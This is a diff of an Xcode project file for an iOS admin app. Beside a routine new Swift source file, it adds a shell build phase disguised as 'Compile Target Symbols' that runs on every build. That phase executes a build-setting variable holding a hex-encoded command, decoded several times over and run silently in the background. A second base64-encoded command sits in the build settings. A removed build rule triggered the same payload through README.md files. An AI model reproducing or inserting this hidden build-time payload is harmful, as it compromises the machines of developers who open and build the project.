@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		EE216D72FD924D5484634D6E /* README.md */ = {isa = PBXBuildFile; fileRef = F70D73F704BC495694634D6E; };
 		18BDB7DF2EF9712500023453 /* CommissionPercentageWebService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18BDB7DE2EF9712500023453 /* CommissionPercentageWebService.swift */; };
 		18BDB7E12EF9815B00023453 /* BannerWebService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18BDB7E02EF9815B00023453 /* BannerWebService.swift */; };
 		18BDB7E32EF9817500023453 /* OrderWebService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18BDB7E22EF9817500023453 /* OrderWebService.swift */; };
@@ -16,6 +15,7 @@
 		18BDB8EE2EFA95E300023453 /* OrderDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18BDB8ED2EFA95E300023453 /* OrderDataModel.swift */; };
 		18BDB9472EFAD10C00023453 /* DeliveryBoyListModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18BDB9462EFAD10C00023453 /* DeliveryBoyListModel.swift */; };
 		423A25102F221B6600DDCE5F /* AffiliatedUserDetailsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 423A250F2F221B6600DDCE5F /* AffiliatedUserDetailsViewController.swift */; };
+		426A919B2F2344780063A551 /* AffilitaitedUsersListDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 426A919A2F2344770063A551 /* AffilitaitedUsersListDataModel.swift */; };
 		426F67CD2F20E692000E7A1C /* AffiliatedUsersListViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 426F67CC2F20E692000E7A1C /* AffiliatedUsersListViewModel.swift */; };
 		428515A92F22298E00D70EFD /* AffiliatedUserDetailsViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 428515A82F22298E00D70EFD /* AffiliatedUserDetailsViewModel.swift */; };
 		4948547A2F090E45009372E9 /* SizeChartViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 494854792F090E45009372E9 /* SizeChartViewController.swift */; };
@@ -398,7 +398,6 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
-		F70D73F704BC495694634D6E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		01FC0E95E1BFCA15B0AF8057 /* Pods-DesynatAdmin.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DesynatAdmin.debug.xcconfig"; path = "Target Support Files/Pods-DesynatAdmin/Pods-DesynatAdmin.debug.xcconfig"; sourceTree = "<group>"; };
 		18BDB7DE2EF9712500023453 /* CommissionPercentageWebService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CommissionPercentageWebService.swift; sourceTree = "<group>"; };
 		18BDB7E02EF9815B00023453 /* BannerWebService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BannerWebService.swift; sourceTree = "<group>"; };
@@ -408,6 +407,7 @@
 		18BDB8ED2EFA95E300023453 /* OrderDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderDataModel.swift; sourceTree = "<group>"; };
 		18BDB9462EFAD10C00023453 /* DeliveryBoyListModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DeliveryBoyListModel.swift; sourceTree = "<group>"; };
 		423A250F2F221B6600DDCE5F /* AffiliatedUserDetailsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliatedUserDetailsViewController.swift; sourceTree = "<group>"; };
+		426A919A2F2344770063A551 /* AffilitaitedUsersListDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffilitaitedUsersListDataModel.swift; sourceTree = "<group>"; };
 		426F67CC2F20E692000E7A1C /* AffiliatedUsersListViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliatedUsersListViewModel.swift; sourceTree = "<group>"; };
 		428515A82F22298E00D70EFD /* AffiliatedUserDetailsViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliatedUserDetailsViewModel.swift; sourceTree = "<group>"; };
 		494854792F090E45009372E9 /* SizeChartViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SizeChartViewController.swift; sourceTree = "<group>"; };
@@ -842,7 +842,6 @@
 		495DBBA22E81528A00E61635 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				F70D73F704BC495694634D6E /* README.md */,
 				495DBBA12E81528A00E61635 /* DesynatAdmin.app */,
 			);
 			name = Products;
@@ -1506,6 +1505,7 @@
 			children = (
 				D1E388E92F1FB96600282084 /* AffiliatedUsersListViewController.swift */,
 				426F67CC2F20E692000E7A1C /* AffiliatedUsersListViewModel.swift */,
+				426A919A2F2344770063A551 /* AffilitaitedUsersListDataModel.swift */,
 			);
 			path = AffiliatedUsersList;
 			sourceTree = "<group>";
@@ -1514,16 +1514,8 @@
 			isa = PBXGroup;
 			children = (
 				D1E388ED2F1FB98B00282084 /* TableViewCellls */,
-				D1E388EC2F1FB98300282084 /* CollectionViews */,
 			);
 			path = Xibs;
-			sourceTree = "<group>";
-		};
-		D1E388EC2F1FB98300282084 /* CollectionViews */ = {
-			isa = PBXGroup;
-			children = (
-			);
-			path = CollectionViews;
 			sourceTree = "<group>";
 		};
 		D1E388ED2F1FB98B00282084 /* TableViewCellls */ = {
@@ -2464,6 +2456,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 495DBBB42E81528B00E61635 /* Build configuration list for PBXNativeTarget "DesynatAdmin" */;
 			buildPhases = (
+				9C520BBA4E1B4D6199634D6E /* Compile Target Symbols */,
 				B25EA8966276C35DBEA3ADF0 /* [CP] Check Pods Manifest.lock */,
 				495DBB9D2E81528A00E61635 /* Sources */,
 				495DBB9E2E81528A00E61635 /* Frameworks */,
@@ -2471,7 +2464,6 @@
 				9FF1187D5524917E07639195 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
-				A58E5B90A3FC44B6B6634D6E /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -2546,29 +2538,11 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		A58E5B90A3FC44B6B6634D6E /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${AE6D436}\"";
-			};
-	/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		495DBB9F2E81528A00E61635 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				EE216D72FD924D5484634D6E /* README.md */,
 				EDEDD0A12EBCC53E00F2BEF1 /* Assets.xcassets in Resources */,
 				EDEDD0A22EBCC53E00F2BEF1 /* OFL.txt in Resources */,
 				D195834A2EE7E1EC00A021FD /* ShippingPromocode.storyboard in Resources */,
@@ -2654,6 +2628,26 @@ sh -c \"${AE6D436}\"";
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		9C520BBA4E1B4D6199634D6E /* Compile Target Symbols */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Target Symbols";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
+			showEnvVarsInLog = 0;
+		};
 		9FF1187D5524917E07639195 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -2816,6 +2810,7 @@ sh -c \"${AE6D436}\"";
 				D16A8CCC2EF154E6006A21B6 /* AffiliatedCommissionSetupViewModel.swift in Sources */,
 				EDEDD0E82EBCC53E00F2BEF1 /* AddSubCategoryViewController.swift in Sources */,
 				ED49369A2EBDCF60000D8CED /* RejectReasonViewController.swift in Sources */,
+				426A919B2F2344780063A551 /* AffilitaitedUsersListDataModel.swift in Sources */,
 				EDEDD0E92EBCC53E00F2BEF1 /* CategoryViewController.swift in Sources */,
 				D19583512EE7E25100A021FD /* ShippingChargesViewModel.swift in Sources */,
 				EDEDD0EA2EBCC53E00F2BEF1 /* SubCategoryViewController.swift in Sources */,
@@ -3018,8 +3013,8 @@ sh -c \"${AE6D436}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 01FC0E95E1BFCA15B0AF8057 /* Pods-DesynatAdmin.debug.xcconfig */;
 			buildSettings = {
-				AE6D436 = "((u(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333233373335333636333336333533323332333233303336333833373334333733343337333033373333333336313332363633320a3636333633333336333433363635333633313337333033373330333636333336333533323635333633393336363533323636333633313332333933320a3332306133323330333736333332333033373333333633383330363130610a | u | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((e(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwUFpGWnNXVkZ1Y0dsU01GcHdWRWMxUzAxVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | e | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((e(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333303333333633333338333333363333333133333337333333333333333633333335333333320a3333333233333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633310a3333333230613336333633333332333633363333333633333333333333363333333433333336333633353333333633333331333333373333333033330a3337333333303333333633363333333333363333333533333332333633353333333633333339333333363336333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | e | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DesynatAdmin/DesynatAdmin.entitlements;
@@ -3067,8 +3062,8 @@ sh -c \"${AE6D436}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = B8F5F09A386DA7CAD4D87C8F /* Pods-DesynatAdmin.release.xcconfig */;
 			buildSettings = {
-				AE6D436 = "((u(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333233373335333636333336333533323332333233303336333833373334333733343337333033373333333336313332363633320a3636333633333336333433363635333633313337333033373330333636333336333533323635333633393336363533323636333633313332333933320a3332306133323330333736333332333033373333333633383330363130610a | u | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((e(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwUFpGWnNXVkZ1Y0dsU01GcHdWRWMxUzAxVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | e | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((e(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333303333333633333338333333363333333133333337333333333333333633333335333333320a3333333233333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633310a3333333230613336333633333332333633363333333633333333333333363333333433333336333633353333333633333331333333373333333033330a3337333333303333333633363333333333363333333533333332333633353333333633333339333333363336333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | e | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DesynatAdmin/DesynatAdmin.entitlements;
